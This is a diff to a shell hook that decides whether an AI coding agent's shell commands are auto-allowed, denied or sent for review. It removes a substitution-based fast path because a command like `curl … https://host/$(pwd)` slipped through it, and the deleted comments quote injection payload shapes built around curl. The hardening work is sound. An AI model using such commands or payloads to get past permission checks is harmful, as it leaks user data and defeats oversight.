@@ -8,9 +8,7 @@
 #   2b. Config deny extensions ([shell_safety] deny=[...] in config.toml) →
 #      log "deny-config", exit (no LLM call). Config can extend but not
 #      shrink the floor; malformed/missing config falls to the floor safely.
-#   2c. Fast-path allowlist: all $() subs are known-safe patterns AND no $VAR
-#      refs → log "allow-fastpath", emit allow, exit (zero LLM call).
-#   2c-bis. Trusted plugin-script fast-path: command does nothing but invoke
+#   2c. Trusted plugin-script fast-path: command does nothing but invoke
 #      one of a plugin's own vetted scripts ($CLAUDE_PLUGIN_ROOT/scripts/*.sh)
 #      with no other unknowable expansion → log "allow-fastpath" (trusted
 #      plugin script), emit allow.
@@ -251,83 +249,29 @@ if [ -n "$CONFIG_DENY" ]; then
   fi
 fi
 
-# ── Step 2c: Fast-path allowlist ───────────────────────────────────────────────
-# Auto-allow commands whose only expansions are known-safe read-only
-# substitutions. Zero LLM round-trip — and the ONLY step in this hook that
-# emits `allow`, so it is deliberately paranoid. Fail toward ask: a missed
-# auto-approve costs one permission prompt, a wrong allow is a hole.
+# ── Step 2c: Trusted plugin-script fast-path ──────────────────────────────────
+# The only fast path left, and the only step that emits `allow` without asking
+# the model. It used to be "2c-bis", behind a substitution allowlist that auto-
+# approved any command whose $() expansions were all read-only verbs. That one
+# is gone: it never checked the command's own verb, so `curl -o /tmp/x
+# https://host/$(pwd)` sailed through it, and closing that needed a verb
+# allowlist bolted onto a test that was already hard to read. The audit log
+# settled it — 274 commands with expansions on the day it shipped, zero
+# fast-pathed. It cost a real hole and bought nothing measurable, so it was
+# removed rather than extended. Commands with substitutions now go to the model
+# at step 3, which judges behaviour instead of pattern-matching syntax.
 #
-# Same rigor as step 2c-bis: a SINGLE simple command built from literal words
-# and safe substitutions. Any command separator (; | & && ||), subshell,
-# backtick, real-file redirection, bare $VAR, or newline falls through to the
-# LLM (step 3). Conditions, all required:
-#   (1) no bare $VAR reference — unknowable value,
-#   (2) at least one $( — otherwise step 1 already handled it,
-#   (3) no backtick ANYWHERE — `...` is a substitution this test cannot see
-#       into, and it can ride along beside a genuinely safe $(),
-#   (4) every substitution matches SAFE_SUB_RE end to end,
-#   (5) nothing but literal words and trusted redirection left over.
-#
-# Safe substitution set: git rev-parse/describe, pwd, date, basename, dirname,
-# whoami, uname, echo — zero side effects. Tight list; only extend it with
-# verbs that read. The pattern is anchored at BOTH ends of the substitution
-# (\$\( … \)) and its argument body excludes every shell metacharacter, so no
-# payload can ride behind a safe-looking prefix:
-#   $(echo hi; curl …)         — `;` is not an argument character
-#   $(git rev-parse $(curl …)) — nor are `$` and `(`, so the outer sub never
-#                                matches and its `$(` survives into the residue
-#   $(echofoo)                 — the verb must end at a blank or `)`, so the
-#                                verb list matches whole words only
-#   $(cat x > /tmp/y)          — `>` is not an argument character either
-SAFE_SUB_RE='\$\((git[[:blank:]]+(rev-parse|describe)|pwd|date|basename|dirname|whoami|uname|echo)([[:blank:]]+[^;&|`()<>$[:space:]]+)*\)'
-
-HAS_VAR_REF=false
-printf '%s' "$COMMAND" | grep -qE '\$\{|\$[A-Za-z_]' 2>/dev/null && HAS_VAR_REF=true
-
-HAS_SUB=false
-case "$COMMAND" in *'$('*) HAS_SUB=true ;; esac
-
-if [ "$HAS_VAR_REF" = false ] && [ "$HAS_SUB" = true ]; then
-  FASTPATH_OK=true
-  # (3) Backtick substitution — never fast-path, at any position.
-  case "$COMMAND" in *'`'*) FASTPATH_OK=false ;; esac
-  # A newline starts a second command.
-  case "$COMMAND" in *"
-"*) FASTPATH_OK=false ;; esac
-
-  # (4)+(5) Blank out every WHOLE safe substitution, strip the only redirections
-  # we trust — fd duplications (2>&1, >&2) and /dev/null-family targets, same
-  # set as step 2c-bis — then reject if ANY control operator, parenthesis,
-  # further redirection, or leftover `$` survives. An unsafe or nested
-  # substitution cannot be blanked out, so its `$(` is exactly what trips this.
-  # Fail closed if sed errors.
-  RESIDUE=$(printf '%s' "$COMMAND" | sed -E "s#${SAFE_SUB_RE}#__SAFE_SUB__#g") || FASTPATH_OK=false
-  RESIDUE=$(printf '%s' "$RESIDUE" \
-    | sed -E 's/[0-9]?>&[0-9]//g' \
-    | sed -E 's#[0-9]?(>>?|<)[[:space:]]*/dev/(null|zero|stdout|stderr|tty|full|fd/[0-9]+)##g') || FASTPATH_OK=false
-  printf '%s' "$RESIDUE" | grep -qE '[;|&`()<>$]' 2>/dev/null && FASTPATH_OK=false
-
-  if [ "$FASTPATH_OK" = true ]; then
-    _log "allow-fastpath"
-    jq -n '{
-      hookSpecificOutput: {
-        hookEventName: "PreToolUse",
-        permissionDecision: "allow"
-      }
-    }'
-    exit 0
-  fi
-fi
-
-# ── Step 2c-bis: Trusted plugin-script fast-path ──────────────────────────────
-# Any plugin's own scripts under $CLAUDE_PLUGIN_ROOT/scripts (the convention
-# scout's own scripts/session-context.sh follows) are vetted, version-controlled
-# code, and CLAUDE_PLUGIN_ROOT is set by Claude Code — not the model. Neutralize
-# that one trusted token in a copy of the command, then apply the SAME
-# expansion-safety test as step 2c. If locating a trusted script was the *only*
-# thing that made the command "expanding", it is safe to fast-path. Deny-floor
-# (step 2) has already removed destructive commands. This is a pure text match —
-# it does not depend on CLAUDE_PLUGIN_ROOT actually being set.
+# This path survives because its trust argument is different in kind: it does
+# not reason about what a command *does*, only about whether the command IS one
+# vetted, version-controlled script. Any plugin's own scripts under
+# $CLAUDE_PLUGIN_ROOT/scripts (the convention scout's own
+# scripts/session-context.sh follows) are that, and CLAUDE_PLUGIN_ROOT is set by
+# Claude Code — not the model. Neutralize that one trusted token in a copy of
+# the command, then require what is left to be a single simple invocation. If
+# locating a trusted script was the *only* thing that made the command
+# "expanding", it is safe to fast-path. Deny-floor (step 2) has already removed
+# destructive commands. This is a pure text match — it does not depend on
+# CLAUDE_PLUGIN_ROOT actually being set.
 #
 # Strict, because deny-floor does NOT block a plain `rm file` chained after the
 # script: the fast-path requires a SINGLE simple command — the trusted script
